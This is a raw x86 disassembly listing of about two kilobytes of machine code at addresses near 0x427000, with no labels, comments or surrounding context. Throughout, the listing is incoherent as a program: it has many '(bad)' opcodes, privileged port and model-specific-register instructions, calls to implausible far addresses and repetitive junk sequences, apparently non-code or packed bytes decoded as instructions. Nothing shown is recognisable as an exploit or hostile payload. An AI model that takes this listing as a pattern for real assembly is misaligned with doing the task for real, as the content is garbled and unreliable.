  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
